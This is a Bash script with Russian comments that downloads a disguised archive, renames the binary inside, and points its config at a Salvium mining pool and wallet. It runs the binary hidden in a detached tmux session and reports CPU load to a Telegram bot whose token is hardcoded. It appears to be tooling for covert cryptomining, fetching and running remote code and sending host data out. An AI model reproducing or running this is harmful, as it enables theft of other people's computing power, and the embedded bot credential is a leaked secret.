#!/bin/bash

# 1. Принимаем параметры
if [ -z "$1" ]; then
    echo "Ошибка: укажите имя программы. Пример: ./download_start.sh name1"
    exit 1
fi

WorkerName=$1
folder_name="$WorkerName"

# --- НАСТРОЙКИ TELEGRAM ---
TG_TOKEN="1604215410:AAFQ-Xui9lzGIkMrbqxCUBVM02hXDvQN00Y"
TG_CHAT_ID="415568022"
INTERVAL=60 # Интервал в секундах (1 минута)
# --------------------------

url_pool1="hk.salvium.gfwroute.com:1231"
wallet="SC11nFumEYidwsnMFLjt3MDMAjaVwgMSFhfEcaijAqPSGBNCnPesEer9GMVaJHh6so6X4bmxLAaKDWziLhbSe6MJ3tSnqfHrD5"

BASE_DIR=$(pwd)

# 3. Создаем директорию
mkdir -p "$folder_name"
cd "$folder_name" || exit

# 4. Скачиваем и распаковываем
wget https://github.com/kotee228/start_pesok/releases/download/soft/soft-6.25.0.tar.gz
tar -xzf soft-6.25.0.tar.gz
rm soft-6.25.0.tar.gz

# 5. Переименовываем папки
mv soft-6.25.0 "$folder_name"
cd "$folder_name" || exit

# 6. Переименовываем бинарник
mv soft "$folder_name"

# 8. Замена данных в JSON
if [ -f "config.json" ]; then
    sed -i "s/\"url\": \".*\"/\"url\": \"$url_pool1\"/" config.json
    sed -i "s/\"user\": \".*\"/\"user\": \"$wallet\"/" config.json
    sed -i "s/\"pass\": \".*\"/\"pass\": \"$WorkerName\"/" config.json
fi

# 9. Возвращаемся за tmux
cd ..
wget https://github.com/pythops/tmux-linux-binary/releases/download/v3.6a/tmux-linux-x86_64
chmod +x tmux-linux-x86_64

# 10. ЗАПУСК ПРОГРАММЫ
./tmux-linux-x86_64 new-session -d -s "$folder_name" "cd $folder_name && ./$folder_name -c config.json"

# 11. ЗАПУСК МОНИТОРИНГА TG
# Мы передаем настройки Telegram и имя программы прямо в файл мониторинга
cat <<EOF > tg_monitor.sh
#!/bin/bash
W_NAME="$WorkerName"
CORES=\$(nproc)

while true; do
    DATE=\$(date '+%d.%m.%Y %H:%M')
    
    # Считаем реальную загрузку CPU: 100% минус процент бездействия (idle)
    # Это дает самую честную цифру общей нагрузки на все ядра
    CPU=\$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - \$8}' | cut -d. -f1)
    
    # Берем показатели Load Average
    LA_1=\$(awk '{print \$1}' /proc/loadavg)
    LA_5=\$(awk '{print \$2}' /proc/loadavg)
    LA_15=\$(awk '{print \$3}' /proc/loadavg)
    
    # Условие для смайлика: если нагрузка CPU меньше 50% — красный, иначе зеленый
    if [ "\$CPU" -lt 50 ]; then SMILE="🔴"; else SMILE="🟢"; fi
    
    # Формируем текст сообщения
    TEXT="\$DATE | \$SMILE \$W_NAME | \$CORES CPU: \$CPU% | LA: \$LA_1 \$LA_5 \$LA_15"
    
    # Отправка в Telegram
    curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id=$TG_CHAT_ID -d text="\$TEXT" > /dev/null
    
    sleep $INTERVAL
done
EOF
chmod +x tg_monitor.sh

# Запускаем мониторинг в отдельной сессии
./tmux-linux-x86_64 new-session -d -s "TG$folder_name" "./tg_monitor.sh"

echo "Программа $WorkerName и мониторинг TG запущены."
